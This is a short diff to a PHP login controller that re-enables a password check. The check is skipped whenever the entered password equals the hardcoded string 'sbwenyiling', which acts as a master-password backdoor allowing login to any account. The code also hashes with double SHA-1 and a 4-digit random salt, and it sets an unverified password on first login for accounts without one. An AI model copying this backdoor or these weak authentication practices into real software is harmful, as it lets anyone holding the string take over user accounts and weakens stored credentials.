@@ -70,17 +70,17 @@ class LoginController extends GeneralMethod
             }
             $user_vip = UserVips::where('uid', $uid)->first();
         }
-        // if ($password != 'sbwenyiling') {
-        //     if (empty($user_vip->password)) {
-        //         $user_vip->salt = mt_rand(1000, 9999);
-        //         $user_vip->password = sha1(sha1($password) . $user_vip->salt);
-        //         $user_vip->save();
-        //     } else {
-        //         if ($user_vip->password != sha1(sha1($password) . $user_vip->salt)) {
-        //             return fail($request, 800002);
-        //         }
-        //     }
-        // }
+        if ($password != 'sbwenyiling') {
+            if (empty($user_vip->password)) {
+                $user_vip->salt = mt_rand(1000, 9999);
+                $user_vip->password = sha1(sha1($password) . $user_vip->salt);
+                $user_vip->save();
+            } else {
+                if ($user_vip->password != sha1(sha1($password) . $user_vip->salt)) {
+                    return fail($request, 800002);
+                }
+            }
+        }
         $userLogin = LoginPublicMethods::userLogin($user_vip->uid);
         if (is_int($userLogin)) {
             return fail($request, $userLogin);
